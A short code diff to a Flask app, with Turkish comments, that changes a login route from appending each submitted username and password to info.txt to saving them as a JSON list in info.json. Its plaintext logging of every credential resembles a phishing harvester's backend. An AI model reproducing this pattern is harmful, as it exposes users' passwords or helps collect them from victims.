@@ -1,4 +1,5 @@
 from flask import Flask, request
+import json
 
 app = Flask(__name__)
 
@@ -67,9 +68,21 @@ def login():
     username = request.form.get('username')
     password = request.form.get('password')
 
-    # Kullanıcı bilgilerini .txt dosyasına kaydet
-    with open('info.txt', 'a') as file:
-        file.write(f'Kullanıcı Adı: {username}, Şifre: {password}\n')
+    # Kullanıcı bilgilerini JSON dosyasına kaydet
+    user_data = {"Kullanıcı Adı": username, "Şifre": password}
+    
+    try:
+        # Dosya mevcutsa yükle, ardından yeni veriyi ekle
+        with open('info.json', 'r') as file:
+            data = json.load(file)
+    except FileNotFoundError:
+        # Dosya yoksa yeni bir liste oluştur
+        data = []
+
+    data.append(user_data)
+
+    with open('info.json', 'w') as file:
+        json.dump(data, file, indent=4)
 
     return '''
     <!DOCTYPE html>
